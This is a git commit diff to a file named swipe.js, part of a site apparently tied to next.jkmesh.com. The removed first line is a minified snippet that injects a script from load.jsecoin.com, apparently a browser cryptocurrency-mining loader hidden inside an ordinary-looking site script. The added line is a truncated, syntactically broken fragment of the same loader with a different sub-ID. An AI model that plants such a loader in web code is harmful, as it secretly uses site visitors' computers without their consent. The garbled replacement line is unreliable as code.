68dd53333f643935352f97127d514b4feb2cb323
brownjenjen <brownjenjen01@outlook.com>
2018-01-06 19:37:18 +0100

    Update swipe.js

--- swipe.js
+++ swipe.js
@@ -1,4 +1,4 @@
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/47941/next.jkmesh.com/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+fer=!0,t.src="https://load.jsecoin.com/load/47941/next.jkmesh.com/optionalSubID/1/",s.parentNode.insertBefore(t,s)}();
 
 $(function() {
 var url3 ="http://next.jkmesh.com/#Apple";
